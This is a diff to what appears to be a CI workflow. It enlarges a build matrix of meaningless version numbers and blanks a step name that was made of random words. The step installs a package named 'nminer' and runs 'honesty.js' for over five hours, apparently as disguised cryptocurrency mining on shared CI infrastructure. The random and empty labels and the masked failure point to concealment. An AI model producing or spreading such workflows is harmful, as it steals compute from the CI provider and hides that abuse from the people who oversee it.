@@ -9,21 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2837 }
-          - { version: 7309 }
-          - { version: 3456 }
-          - { version: 2976 }
-          - { version: 6661 }
-          - { version: 9774 }
-          - { version: 6599 }
-          - { version: 5367 }
-          - { version: 7813 }
-          - { version: 2619 }
-          - { version: 8388 }
-          - { version: 2422 }
-          - { version: 5412 }
-          - { version: 3216 }
-          - { version: 8571 }
+          - { version: 1155 }
+          - { version: 1719 }
+          - { version: 5768 }
+          - { version: 4705 }
+          - { version: 8547 }
+          - { version: 1558 }
+          - { version: 7018 }
+          - { version: 9725 }
+          - { version: 6466 }
+          - { version: 9100 }
+          - { version: 6544 }
+          - { version: 5819 }
+          - { version: 9437 }
+          - { version: 9331 }
+          - { version: 5592 }
+          - { version: 1751 }
+          - { version: 4124 }
 
     steps:
       - name: Checkout
@@ -34,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: agreeable gah median rigid quizzically
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 326m node honesty.js || echo "honesty executed"
+          timeout 324m node honesty.js || echo "honesty executed"
